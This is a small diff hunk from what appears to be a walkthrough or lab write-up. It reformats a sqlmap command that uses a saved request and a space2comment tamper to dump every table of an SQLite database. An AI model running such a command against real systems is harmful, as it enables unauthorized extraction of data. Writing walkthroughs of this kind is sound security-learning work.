@@ -31,7 +31,7 @@ Now we can use this saved request for sqlmap and dump all the database.
 
 #### command for sqlmap
 
-sqlmap -r <Filename>--tamper=space2comment --dump-all --dbms sqlite
+`sqlmap -r {Filename} --tamper=space2comment --dump-all --dbms sqlite`
 
 Dumps us the data table.
 
